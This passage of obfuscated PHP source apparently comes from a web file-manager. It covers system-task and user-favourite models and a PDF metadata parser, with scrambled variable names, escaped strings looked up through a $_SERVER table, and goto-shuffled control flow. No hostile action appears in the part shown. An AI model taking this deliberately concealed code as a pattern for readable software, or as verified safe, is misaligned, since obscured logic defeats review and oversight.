$Aë¢ÍŠ¬ÍÁ = array(); $bôº¨ŠÎè = array_filter(explode($B…§Æ˜“ê[47], $Dİî®øÖñ)); foreach ($bôº¨ŠÎè as $Dİî®øÖñ) { $cÕ¥¡õİÉ¶ = explode($B…§Æ˜“ê[91], $Dİî®øÖñ); if ($cÕ¥¡õİÉ¶[0] == $B…§Æ˜“ê[1784] && $cÕ¥¡õİÉ¶[1] != $B…§Æ˜“ê[1035]) { $a¼·œ¿é“å = $cÕ¥¡õİÉ¶[0] . $B…§Æ˜“ê[91] . $cÕ¥¡õİÉ¶[1] . $B…§Æ˜“ê[2489]; if (!in_array($a¼·œ¿é“å, $bôº¨ŠÎè)) { $Aë¢ÍŠ¬ÍÁ[] = $a¼·œ¿é“å; } } $Aë¢ÍŠ¬ÍÁ[] = $Dİî®øÖñ; } $Dİî®øÖñ = implode($B…§Æ˜“ê[47], $Aë¢ÍŠ¬ÍÁ); } public function sort($FÛí§†İƒá, $eôÕáŒ¸ù) { return parent::update($FÛí§†İƒá, $eôÕáŒ¸ù); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x74\x61\x73\x6b\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x74\x79\160\x65", "\x65\x76\145\x6e\164", "\164\x69\x6d\x65", "\x64\x65\x73\143", "\x73\x79\163\164\145\x6d", "\x65\156\141\x62\154\x65", "\x6c\x61\x73\164\122\165\x6e", "\163\157\162\x74"); public function listData($dºŒËèš = false, $cÔˆ…‘¡— = "\163\x6f\x72\x74", $fì“¸ÅåÍ = false) { return parent::listData($dºŒËèš, $cÔˆ…‘¡—, $fì“¸ÅåÍ); } public function add($Cö²Î¥¥ˆ») { $E¸ø¼Ë†„ˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $F ÚÙ‹Œ˜ = $this->findByName($Cö²Î¥¥ˆ»[$E¸ø¼Ë†„ˆ[28]]); if ($F ÚÙ‹Œ˜) { return !1; } $Cö²Î¥¥ˆ»[$E¸ø¼Ë†„ˆ[1402]] = 0; $Cö²Î¥¥ˆ»[$E¸ø¼Ë†„ˆ[2126]] = $this->getSort(); return parent::insert($Cö²Î¥¥ˆ»); } private function getSort() { $B‰§œÜ¾« =& $_SERVER[¼€¼ˆ¦‚¡]; $C›©Ş×³µµ = parent::listData(); $b„ôÖÉÆö = array_to_keyvalue($C›©Ş×³µµ, $B‰§œÜ¾«[33], $B‰§œÜ¾«[2126]); return empty($b„ôÖÉÆö) ? 0 : max($b„ôÖÉÆö) + 1; } public function update($C¦øŞÊ‰¯Ô, $DÁÈÇÀÔ¤) { $BÆöØŞ™•© =& $_SERVER[¼€¼ˆ¦‚¡]; $cç‡Ñáë = $this->listData($C¦øŞÊ‰¯Ô); $f¨¨ß²ß›Œ = $this->findByName($DÁÈÇÀÔ¤[$BÆöØŞ™•©[28]]); if (!$cç‡Ñáë || $f¨¨ß²ß›Œ && $f¨¨ß²ß›Œ[$BÆöØŞ™•©[367]] != $cç‡Ñáë[$BÆöØŞ™•©[367]]) { return !1; } return parent::update($C¦øŞÊ‰¯Ô, $DÁÈÇÀÔ¤); } public function remove($fŒÅŠ£ÙÃ, $cìÅ¡ã¤Œ© = false) { $C’ƒôÏÀ¤¿ =& $_SERVER[¼€¼ˆ¦‚¡]; $CƒÕÏÚÒÕã = $this->listData($fŒÅŠ£ÙÃ); if (!$CƒÕÏÚÒÕã) { return; } if (!$cìÅ¡ã¤Œ© && $CƒÕÏÚÒÕã[$C’ƒôÏÀ¤¿[1080]] == $C’ƒôÏÀ¤¿[83]) { return !1; } return parent::remove($fŒÅŠ£ÙÃ); } public function enable($bšõÜê¬¦, $eç×¬·œ³½) { return $this->update($bšõÜê¬¦, array($_SERVER[¼€¼ˆ¦‚¡][2479] => $eç×¬·œ³½)); } public function run($E‘İ›Ú“îˆ) { return $this->update($E‘İ›Ú“îˆ, array($_SERVER[¼€¼ˆ¦‚¡][2490] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($eÛ×’ãƒÀ) { $bøï„ÏëŞ =& $_SERVER[¼€¼ˆ¦‚¡]; return array($bøï„ÏëŞ[2491] => array(USER_ID, $bøï„ÏëŞ[2492])); } protected function listData() { $Aó§¢ó¦®ˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $AÚ’ùÔòˆ = array($Aó§¢ó¦®ˆ[1428] => USER_ID, $Aó§¢ó¦®ˆ[436] => 0); $E¨è†ñÁ­Ÿ = $Aó§¢ó¦®ˆ[2493]; $F‚ä‚õÊÁŒ = $this->field($E¨è†ñÁ­Ÿ)->where($AÚ’ùÔòˆ)->order($Aó§¢ó¦®ˆ[2494])->select(); return $F‚ä‚õÊÁŒ ? $F‚ä‚õÊÁŒ : array(); } protected function resetCache() { } protected function listView() { goto eìÖ…¥½ß÷; bÔ¦àõÔ‘¶: $Dƒä ëæ› = array_to_keyvalue($Dƒä ëæ›, $a¬·±†˜Ï¤[369]); foreach ($C¬ò¹ñ×†— as $c·ŸÛŒí’¿ => $dŒÛôí¼–±) { $bÀ‚ÒØÉ‹ = $Dƒä ëæ›[$dŒÛôí¼–±[$a¬·±†˜Ï¤[75]]]; $bÀ‚ÒØÉ‹ = $bÀ‚ÒØÉ‹ ? $bÀ‚ÒØÉ‹ : array(); $C¬ò¹ñ×†—[$c·ŸÛŒí’¿] = array_merge($bÀ‚ÒØÉ‹, $dŒÛôí¼–±); } return $C¬ò¹ñ×†—; goto A’Û¸Æ‡Ã«; FÉÎø³Ë: $eíˆ¥Í×Ã— = array_to_keyvalue($b—•åöáˆÑ, $a¬·±†˜Ï¤[33], $a¬·±†˜Ï¤[75]); if (!$eíˆ¥Í×Ã—) { return $C¬ò¹ñ×†—; } $b‰Ö…¼°Â­ = 2000; goto A•İô“­‹§; A•İô“­‹§: $b‰ëá¶•÷ = array($a¬·±†˜Ï¤[383] => array($a¬·±†˜Ï¤[384], $eíˆ¥Í×Ã—)); $Dƒä ëæ› = Model($a¬·±†˜Ï¤[749])->listSource($b‰ëá¶•÷, $b‰Ö…¼°Â­); $Dƒä ëæ› = array_merge($Dƒä ëæ›[$a¬·±†˜Ï¤[73]], $Dƒä ëæ›[$a¬·±†˜Ï¤[74]]); goto bÔ¦àõÔ‘¶; eìÖ…¥½ß÷: $a¬·±†˜Ï¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $C¬ò¹ñ×†— = $this->listData(); $b—•åöáˆÑ = array_filter_by_field($C¬ò¹ñ×†—, $a¬·±†˜Ï¤[29], $a¬·±†˜Ï¤[382]); goto FÉÎø³Ë; A’Û¸Æ‡Ã«: } protected function addFav($AÊÌ—£Àó, $EèŒ‹ù¯ƒÏ = '', $C³¯Ì‡¥¼µ = "\163\157\165\162\143\x65") { goto EÑò—¤™¨¯; a×ĞËÅ§®ª: return $this->add($A¬™¼®Òõİ); goto fÈë‚æâë; c—ˆÑÈ›øá: $Bî°ñ—¥½™ = array($EŠôÇ±Şã[1428] => USER_ID, $EŠôÇ±Şã[436] => 0); $eÜÍË†Ãß = $this->where($Bî°ñ—¥½™)->max($EŠôÇ±Şã[2126]); if (!$eÜÍË†Ãß) { $eÜÍË†Ãß = 0; } goto E¦Î‡Ç÷·Ş; E¦Î‡Ç÷·Ş: if (!$EèŒ‹ù¯ƒÏ && $C³¯Ì‡¥¼µ == $EŠôÇ±Şã[382]) { $Fòİù—Ç¢ = Model($EŠôÇ±Şã[1117])->where(array($EŠôÇ±Şã[383] => $AÊÌ—£Àó))->find(); if (!$Fòİù—Ç¢) { return !1; } $EèŒ‹ù¯ƒÏ = $Fòİù—Ç¢[$EŠôÇ±Şã[28]]; } $EèŒ‹ù¯ƒÏ = $this->getAutoName($EèŒ‹ù¯ƒÏ); $A¬™¼®Òõİ = array($EŠôÇ±Şã[1428] => USER_ID, $EŠôÇ±Şã[436] => 0, $EŠôÇ±Şã[386] => $EèŒ‹ù¯ƒÏ, $EŠôÇ±Şã[387] => $AÊÌ—£Àó, $EŠôÇ±Şã[388] => $C³¯Ì‡¥¼µ, $EŠôÇ±Şã[2109] => $eÜÍË†Ãß + 1); goto a×ĞËÅ§®ª; EÑò—¤™¨¯: $EŠôÇ±Şã =& $_SERVER[¼€¼ˆ¦‚¡]; $Bî°ñ—¥½™ = array($EŠôÇ±Şã[1428] => USER_ID, $EŠôÇ±Şã[436] => 0, $EŠôÇ±Şã[388] => $C³¯Ì‡¥¼µ, $EŠôÇ±Şã[387] => $AÊÌ—£Àó); if ($this->where($Bî°ñ—¥½™)->find()) { return !1; } goto c—ˆÑÈ›øá; fÈë‚æâë: } protected function remove($BÓ¾†Ã•Ùõ) { $Dù™ÏÃ¯³ =& $_SERVER[¼€¼ˆ¦‚¡]; $dµö¿ß½¡õ = array($Dù™ÏÃ¯³[1428] => USER_ID, $Dù™ÏÃ¯³[385] => $BÓ¾†Ã•Ùõ); return $this->where($dµö¿ß½¡õ)->delete(); } protected function removeByName($AŞÎ¦ÕÍé) { $CĞó¥§£à =& $_SERVER[¼€¼ˆ¦‚¡]; $eŠø’ÉØÓ = array($CĞó¥§£à[1428] => USER_ID, $CĞó¥§£à[386] => $AŞÎ¦ÕÍé, $CĞó¥§£à[436] => 0); return $this->where($eŠø’ÉØÓ)->delete(); } protected function rename($B’‚Ô¤¾¶È, $dÚŒåâéÈ») { $d´ì”¿±¶ß =& $_SERVER[¼€¼ˆ¦‚¡]; if ($B’‚Ô¤¾¶È == $dÚŒåâéÈ») { return !1; } $bôìóàøŞ = $this->getAutoName($dÚŒåâéÈ»); if ($dÚŒåâéÈ» != $bôìóàøŞ) { return !1; } $E¢¦ğ¥ñÉ = array($d´ì”¿±¶ß[1428] => USER_ID, $d´ì”¿±¶ß[436] => 0, $d´ì”¿±¶ß[28] => $B’‚Ô¤¾¶È); return $this->where($E¢¦ğ¥ñÉ)->save(array($d´ì”¿±¶ß[28] => $dÚŒåâéÈ»)); } protected function resetSort($D±ÈÃ¥á»š) { $fŸã³¶ÀÒÁ =& $_SERVER[¼€¼ˆ¦‚¡]; $D±ÈÃ¥á»š = is_array($D±ÈÃ¥á»š) ? $D±ÈÃ¥á»š : array(); $DÇ˜–í· = array($fŸã³¶ÀÒÁ[1428] => USER_ID); for ($fÊö¿ŒÇò = 0; $fÊö¿ŒÇò < count($D±ÈÃ¥á»š); $fÊö¿ŒÇò++) { $DÇ˜–í·[$fŸã³¶ÀÒÁ[385]] = $D±ÈÃ¥á»š[$fÊö¿ŒÇò]; $this->where($DÇ˜–í·)->save(array($fŸã³¶ÀÒÁ[2109] => $fÊö¿ŒÇò + 1)); } return !0; } protected function moveTop($AäãğÁƒßè) { goto có›³ßé–¤; có›³ßé–¤: $e‡‡·àÛƒ¿ =& $_SERVER[¼€¼ˆ¦‚¡]; $C™¦‚¯‰‘ì = array($e‡‡·àÛƒ¿[1428] => USER_ID, $e‡‡·àÛƒ¿[436] => 0); $dÚ’ôºåÁÍ = $this->where($C™¦‚¯‰‘ì)->where(array($e‡‡·àÛƒ¿[28] => $AäãğÁƒßè))->find(); goto CÍÛ¬¾À™; F¾Ôôåã½¦: $BáÔ¤ù’¬ì = $d¦è„†À™µ; $d¦è„†À™µ = array_remove_value($d¦è„†À™µ, $dÚ’ôºåÁÍ[$e‡‡·àÛƒ¿[367]]); array_unshift($d¦è„†À™µ, $dÚ’ôºåÁÍ[$e‡‡·àÛƒ¿[367]]); goto dÚ°¬å·Ê; dÚ°¬å·Ê: return $this->resetSort($d¦è„†À™µ); goto A˜¬óîˆ¬; CÍÛ¬¾À™: if (!$dÚ’ôºåÁÍ) { return; } $d¦è„†À™µ = $this->field($e‡‡·àÛƒ¿[367])->where($C™¦‚¯‰‘ì)->order($e‡‡·àÛƒ¿[2494])->select(); $d¦è„†À™µ = array_to_keyvalue($d¦è„†À™µ, $e‡‡·àÛƒ¿[33], $e‡‡·àÛƒ¿[367]); goto F¾Ôôåã½¦; A˜¬óîˆ¬: } protected function moveBottom($cÓÚÛ½¡äŒ) { $a¯£¸›«‹ó =& $_SERVER[¼€¼ˆ¦‚¡]; $b‰›ŒÖ¹ŞÍ = array($a¯£¸›«‹ó[1428] => USER_ID, $a¯£¸›«‹ó[436] => 0); $Eäšï®¬ƒ = $this->where($b‰›ŒÖ¹ŞÍ)->max($a¯£¸›«‹ó[2126]); $FãÁğŞ±Ö  = array($a¯£¸›«‹ó[2126] => $Eäšï®¬ƒ + 1); return $this->where($b‰›ŒÖ¹ŞÍ)->where(array($a¯£¸›«‹ó[28] => $cÓÚÛ½¡äŒ))->save($FãÁğŞ±Ö ); } private function getAutoName($bê‡¶ØÎÇ£) { goto cêÖĞ‰õë; F¬¸Ÿ“°…‹: return $bê‡¶ØÎÇ£ . "\x28{$dñÃè»±Ï}\51"; goto fò÷½ù‰Ò§; cêÖĞ‰õë: $d’µÙÀÕ„î =& $_SERVER[¼€¼ˆ¦‚¡]; $FŞŞ´ÖÕÁá = array($d’µÙÀÕ„î[1428] => USER_ID, $d’µÙÀÕ„î[436] => 0); $c¸ Ç±èË = $this->field($d’µÙÀÕ„î[28])->where($FŞŞ´ÖÕÁá)->select(); goto CÜ•ùµè‹Õ; CÜ•ùµè‹Õ: $c¸ Ç±èË = array_to_keyvalue($c¸ Ç±èË, $d’µÙÀÕ„î[33], $d’µÙÀÕ„î[28]); if (!$c¸ Ç±èË || !in_array($bê‡¶ØÎÇ£, $c¸ Ç±èË)) { return $bê‡¶ØÎÇ£; } for ($dñÃè»±Ï = 0; $dñÃè»±Ï < count($c¸ Ç±èË); $dñÃè»±Ï++) { if (!in_array($bê‡¶ØÎÇ£ . "\x28{$dñÃè»±Ï}\x29", $c¸ Ç±èË)) { return $bê‡¶ØÎÇ£ . "\x28{$dñÃè»±Ï}\51"; } } goto F¬¸Ÿ“°…‹; fò÷½ù‰Ò§: } } goto bˆ°øÎ½ëó; eÅ†Í•ŒîÓ: class FileParsePdf { public static function parse($bäàĞ†½éÁ) { goto aù¡–Á£Å…; aù¡–Á£Å…: $CªÁŸ³“ÉÀ =& $_SERVER[¼€¼ˆ¦‚¡]; $F·È¡«Û = 32 * 1024; $DÙÔ«÷²Ö³ = array($CªÁŸ³“ÉÀ[773] => fopen($bäàĞ†½éÁ, $CªÁŸ³“ÉÀ[1170]), $CªÁŸ³“ÉÀ[75] => $bäàĞ†½éÁ, $CªÁŸ³“ÉÀ[77] => filesize($bäàĞ†½éÁ), $CªÁŸ³“ÉÀ[1532] => $F·È¡«Û); goto E™»íßÜ ¦; CÉáÚÃØÁ´: $Dë•‘²ØÂë = $CªÁŸ³“ÉÀ[1537]; preg_match($Dë•‘²ØÂë, $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1533]], $F¬±¨Ï¾ÈÄ); if (!$Fª»½†ŸË[$CªÁŸ³“ÉÀ[1536]] && count($F¬±¨Ï¾ÈÄ) == 5) { $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1536]] = $F¬±¨Ï¾ÈÄ[3]; $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1538]] = $F¬±¨Ï¾ÈÄ[4]; } goto EŒÍ¨°¥†; E™»íßÜ ¦: $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1533]] = StreamWrapperIO::read($bäàĞ†½éÁ, 0, $F·È¡«Û); $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1534]] = StreamWrapperIO::read($bäàĞ†½éÁ, $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[77]] - $F·È¡«Û, $F·È¡«Û); $f•ö‘«æª× = self::decodeXref($DÙÔ«÷²Ö³); goto BèƒŞÛğôÛ; e•Œ­›¥ø¼: if ($F¬±¨Ï¾ÈÄ[1] && $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1540]] < $F¬±¨Ï¾ÈÄ[1][0]) { $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1540]] = $F¬±¨Ï¾ÈÄ[1][0]; } $Fª»½†ŸË = self::parseInfoItem($Fª»½†ŸË); return $Fª»½†ŸË; goto b°‚ «‰; d÷º¨¼ãÉ: preg_match_all($Dë•‘²ØÂë, $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1533]], $F¬±¨Ï¾ÈÄ); if ($F¬±¨Ï¾ÈÄ[1] && $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1540]] < $F¬±¨Ï¾ÈÄ[1][0]) { $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1540]] = $F¬±¨Ï¾ÈÄ[1][0]; } preg_match_all($Dë•‘²ØÂë, $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1534]], $F¬±¨Ï¾ÈÄ); goto e•Œ­›¥ø¼; EŒÍ¨°¥†: preg_match($Dë•‘²ØÂë, $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1534]], $F¬±¨Ï¾ÈÄ); if (!$Fª»½†ŸË[$CªÁŸ³“ÉÀ[1536]] && count($F¬±¨Ï¾ÈÄ) == 5) { $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1536]] = $F¬±¨Ï¾ÈÄ[3]; $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1538]] = $F¬±¨Ï¾ÈÄ[4]; } preg_match($CªÁŸ³“ÉÀ[1539], $DÙÔ«÷²Ö³[$CªÁŸ³“ÉÀ[1533]], $F¬±¨Ï¾ÈÄ); goto cöÜ‹‚ê½; BèƒŞÛğôÛ: if ($f•ö‘«æª×) { $D¡¯†©¯£ = $f•ö‘«æª×[$CªÁŸ³“ÉÀ[1535]][$CªÁŸ³“ÉÀ[1192]]; $Fª»½†ŸË = self::getObjectValue($DÙÔ«÷²Ö³, $f•ö‘«æª×, $D¡¯†©¯£); } $Fª»½†ŸË = is_array($Fª»½†ŸË) ? $Fª»½†ŸË : array(); $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1536]] = 0; goto CÉáÚÃØÁ´; cöÜ‹‚ê½: if ($F¬±¨Ï¾ÈÄ) { $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1341]] = $F¬±¨Ï¾ÈÄ[1]; } $Fª»½†ŸË[$CªÁŸ³“ÉÀ[1540]] = 0; $Dë•‘²ØÂë = $CªÁŸ³“ÉÀ[1541]; goto d÷º¨¼ãÉ; b°‚ «‰: } private static function parseInfoItem($E±†Å‚˜Ö) { $aœ±’Ñï =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$E±†Å‚˜Ö) { return !1; } $D©¹í»”– = array($aœ±’Ñï[1342] => array($aœ±’Ñï[1542], $aœ±’Ñï[33]), $aœ±’Ñï[1543] => array($aœ±’Ñï[1544], $aœ±’Ñï[33]), $aœ±’Ñï[187] => array($aœ±’Ñï[1545], $aœ±’Ñï[210]), $aœ±’Ñï[107] => array($aœ±’Ñï[1546], $aœ±’Ñï[210]), $aœ±’Ñï[1540] => array($aœ±’Ñï[1540], $aœ±’Ñï[276]), $aœ±’Ñï[1536] => array($aœ±’Ñï[1536], $aœ±’Ñï[276]), $aœ±’Ñï[1538] => array($aœ±’Ñï[1538], $aœ±’Ñï[276]), $aœ±’Ñï[1547] => array($aœ±’Ñï[1548], $aœ±’Ñï[33]), $aœ±’Ñï[1549] => array($aœ±’Ñï[1550], $aœ±’Ñï[33]), $aœ±’Ñï[1551] => array($aœ±’Ñï[1341], $aœ±’Ñï[33])); $EâÈ°âŸ¾ = array(); foreach ($D©¹í»”– as $d°Œ¥¦­Ğ => $d†áŞâèÕ›) { if (!isset($E±†Å‚˜Ö[$d†áŞâèÕ›[0]])) { continue; } $A§›–…­¨Ø = $E±†Å‚˜Ö[$d†áŞâèÕ›[0]]; if (!$A§›–…­¨Ø || is_array($A§›–…­¨Ø)) { continue; } switch ($d†áŞâèÕ›[1]) { case $aœ±’Ñï[276]: $A§›–…­¨Ø = intval($A§›–…­¨Ø); break; case $aœ±’Ñï[210]: if (substr($A§›–…­¨Ø, 0, 2) == $aœ±’Ñï[1552]) { $A§›–…­¨Ø = substr($A§›–…­¨Ø, 2, 14); } if (strtotime($A§›–…­¨Ø)) { $A§›–…­¨Ø = date($aœ±’Ñï[1553], strtotime($A§›–…­¨Ø)); } break; } $EâÈ°âŸ¾[$d°Œ¥¦­Ğ] = $A§›–…­¨Ø; } return $EâÈ°âŸ¾; } private static function decodeXref(&$EØÅœ—ÏÄğ) { goto AÓ••ì ™; AÓ••ì ™: $bñÒä¨ª™š =& $_SERVER[¼€¼ˆ¦‚¡]; $dœ“×º»ğ = $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1534]]; $bğ‹¢ƒÆ˜Õ = array($bñÒä¨ª™š[1535] => array(), $bñÒä¨ª™š[1554] => array()); goto bˆ¿´˜¯ï¦; ağ‘’†©’§: if (preg_match($bñÒä¨ª™š[1561], $AëŞÜÉ¼è, $AåÀí¨††) > 0) { $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[77]] = intval($AåÀí¨††[1]); } if (preg_match($bñÒä¨ª™š[1562], $AëŞÜÉ¼è, $AåÀí¨††) > 0) { $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[1563]] = intval($AåÀí¨††[1]) . $bñÒä¨ª™š[70] . intval($AåÀí¨††[2]); } if (preg_match($bñÒä¨ª™š[1564], $AëŞÜÉ¼è, $AåÀí¨††) > 0) { $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[1565]] = intval($AåÀí¨††[1]) . $bñÒä¨ª™š[70] . intval($AåÀí¨††[2]); } goto E£¹©÷ÜíÇ; aÚÍçİŠ…í: foreach ($AåÀí¨††[3] as $b¤åÕ˜ó›Õ => $D×Ë»îŞƒƒ) { if ($AåÀí¨††[3][$b¤åÕ˜ó›Õ] == $bñÒä¨ª™š[1557]) { $E´¸Úê²ĞÃ = $c¿¿µğ¨ç· . $bñÒä¨ª™š[70] . intval($AåÀí¨††[2][$b¤åÕ˜ó›Õ]); $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1554]][$E´¸Úê²ĞÃ] = intval($AåÀí¨††[1][$b¤åÕ˜ó›Õ]); ++$c¿¿µğ¨ç·; } else { if ($AåÀí¨††[3][$b¤åÕ˜ó›Õ] == $bñÒä¨ª™š[1558]) { ++$c¿¿µğ¨ç·; } else { } } } if (preg_match_all($bñÒä¨ª™š[1559], $dœ“×º»ğ, $AåÀí¨††)) { $BŞÓöÁèŒ° = $EØÅœ—ÏÄğ[$bñÒä¨ª™š[77]] - $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1532]]; foreach ($AåÀí¨††[0] as $b¤åÕ˜ó›Õ => $EÉ¤ñ©°ˆ÷) { $f¤ç§—ãÛå = $AåÀí¨††[1][$b¤åÕ˜ó›Õ] . $bñÒä¨ª™š[70] . $AåÀí¨††[2][$b¤åÕ˜ó›Õ]; $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1554]][$f¤ç§—ãÛå] = strpos($dœ“×º»ğ, $EÉ¤ñ©°ˆ÷) + $BŞÓöÁèŒ° + 1; } } if (preg_match_all($bñÒä¨ª™š[1560], $dœ“×º»ğ, $AåÀí¨††)) { $AëŞÜÉ¼è = count($AåÀí¨††[1]) == 1 ? $AåÀí¨††[1][0] : $AåÀí¨††[1][1]; } else { $AëŞÜÉ¼è = substr($dœ“×º»ğ, -1024 * 5); } goto ağ‘’†©’§; b÷¨—´ÕÖ¹: if (preg_match($bñÒä¨ª™š[1568], $AëŞÜÉ¼è, $AåÀí¨††) > 0) { } return $bğ‹¢ƒÆ˜Õ; goto C‡Íé¨°›¤; E£¹©÷ÜíÇ: if (preg_match($bñÒä¨ª™š[1566], $AëŞÜÉ¼è, $AåÀí¨††) > 0) { $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[1192]] = intval($AåÀí¨††[1]) . $bñÒä¨ª™š[70] . intval($AåÀí¨††[2]); } if (preg_match($bñÒä¨ª™š[1567], $AëŞÜÉ¼è, $AåÀí¨††) > 0) { $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[367]] = array(); $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[367]][0] = $AåÀí¨††[1]; $bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[367]][1] = $AåÀí¨††[2]; } if (!$bğ‹¢ƒÆ˜Õ[$bñÒä¨ª™š[1535]][$bñÒä¨ª™š[1192]]) { return !1; } goto b÷¨—´ÕÖ¹; a’õÄø ÇÎ: if ($EØÅœ—ÏÄğ[$bñÒä¨ª™š[77]] - $B÷øŸõœŠƒ > $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1532]]) { $dÏ—›Í¸÷Ö = 4 * $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1532]]; $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1532]] = $dÏ—›Í¸÷Ö; $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1533]] = StreamWrapperIO::read($EØÅœ—ÏÄğ[$bñÒä¨ª™š[75]], 0, $dÏ—›Í¸÷Ö); $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1534]] = StreamWrapperIO::read($EØÅœ—ÏÄğ[$bñÒä¨ª™š[75]], $EØÅœ—ÏÄğ[$bñÒä¨ª™š[77]] - $dÏ—›Í¸÷Ö, $dÏ—›Í¸÷Ö); $dœ“×º»ğ = $EØÅœ—ÏÄğ[$bñÒä¨ª™š[1534]]; } $c¿¿µğ¨ç· = 0; preg_match_all($bñÒä¨ª™š[1556], $dœ“×º»ğ, $AåÀí¨††); goto aÚÍçİŠ…í; bˆ¿´˜¯ï¦: $E›¤Î„¨§Š = $bñÒä¨ª™š[1555]; if (!preg_match_all($E›¤Î„¨§Š, $dœ“×º»ğ, $AåÀí¨††, PREG_SET_ORDER, 0)) { return !1; } $B÷øŸõœŠƒ = intval($AåÀí¨††[0][1]); goto a’õÄø ÇÎ; C‡Íé¨°›¤: } private static function getObjectValue($E„¼­ÖŞ˜Š, $A—î…Û’Ó, $cºàñ°±») { goto dëÑÌ¢§×Š; fƒõ²†‰âƒ: if (!is_array($cÁôİ£Ñ¢”[1])) { return array(); } $F¦ë‹°„ = array(); for ($Bˆ±¶õ½á÷ = 0; $Bˆ±¶õ½á÷ < count($cÁôİ£Ñ¢”[1]); $Bˆ±¶õ½á÷ += 2) { $bØ‚ïˆª¦ù = $cÁôİ£Ñ¢”[1][$Bˆ±¶õ½á÷]; $DÆ¶¥Æñ‰• = $cÁôİ£Ñ¢”[1][$Bˆ±¶õ½á÷ + 1]; if (count($bØ‚ïˆª¦ù) == 3 && $bØ‚ïˆª¦ù[0] == $BæøøÚ¥šå[8]) { $AŸé²¶Æ¸Ğ = !1; if ($DÆ¶¥Æñ‰•[0] == $BæøøÚ¥šå[1569]) { $DÆ¶¥Æñ‰• = self::getObject($E„¼­ÖŞ˜Š, $A—î…Û’Ó[$BæøøÚ¥šå[1554]][$DÆ¶¥Æñ‰•[1]]); } $AŸé²¶Æ¸Ğ = $DÆ¶¥Æñ‰•[1]; if ($AŸé²¶Æ¸Ğ === !1) { continue; } if (is_string($AŸé²¶Æ¸Ğ)) { $AŸé²¶Æ¸Ğ = self::decodeStr($AŸé²¶Æ¸Ğ); } $F¦ë‹°„[$bØ‚ïˆª¦ù[1]] = $AŸé²¶Æ¸Ğ; } } goto c—ó–‰Á³Œ; c—ó–‰Á³Œ: return $F¦ë‹°„; goto döìˆ—ïæ˜; dëÑÌ¢§×Š: $BæøøÚ¥šå =& $_SERVER[¼€¼ˆ¦‚¡]; $cÁôİ£Ñ¢” = self::getObject($E„¼­ÖŞ˜Š, $A—î…Û’Ó[$BæøøÚ¥šå[1554]][$cºàñ°±»]); if (is_string($cÁôİ£Ñ¢”[1])) { return $cÁôİ£Ñ¢”[1]; } goto fƒõ²†‰âƒ; döìˆ—ïæ˜: } private static function getObject($Dµæ÷›İŞ, $e‘øççÉÊø) { $a­ê·£µ“• = self::getObjectItem($Dµæ÷›İŞ, $e‘øççÉÊø); $a­ê·£µ“• = self::getObjectItem($Dµæ÷›İŞ, $a­ê·£µ“•[2]); return $a­ê·£µ“•; } private static function getObjectItem($dÖ¢ˆÅŠ†, $fÉšøè Ø) { goto c¯ÄÀƒˆè«; fÇ®°ªãÕ×: $a‚ÇÙóôŠ = $fÉšøè Ø >= $DÒÂø£ÊÅ ? $fÉšøè Ø - $DÒÂø£ÊÅ : $fÉšøè Ø; $cùŒ…„ˆÕê = $fÉšøè Ø >= $DÒÂø£ÊÅ ? $dÖ¢ˆÅŠ†[$aÜåŞ’‹‹Ó[1534]] : $dÖ¢ˆÅŠ†[$aÜåŞ’‹‹Ó[1533]]; if ($fÉšøè Ø > $B±°œŠ¤éÃ && $fÉšøè Ø <= $DÒÂø£ÊÅ) { $a‚ÇÙóôŠ = 0; $cùŒ…„ˆÕê = StreamWrapperIO::read($dÖ¢ˆÅŠ†[$aÜåŞ’‹‹Ó[75]], $fÉšøè Ø, $B±°œŠ¤éÃ); } goto FÊøøø•ê…; c¯ÄÀƒˆè«: $aÜåŞ’‹‹Ó =& $_SERVER[¼€¼ˆ¦‚¡]; $B±°œŠ¤éÃ = $dÖ¢ˆÅŠ†[$aÜåŞ’‹‹Ó[1532]]; $DÒÂø£ÊÅ = $dÖ¢ˆÅŠ†[$aÜåŞ’‹‹Ó[77]] - $B±°œŠ¤éÃ; goto fÇ®°ªãÕ×; FÊøøø•ê…: $BÁ“Ê¶¼Á = 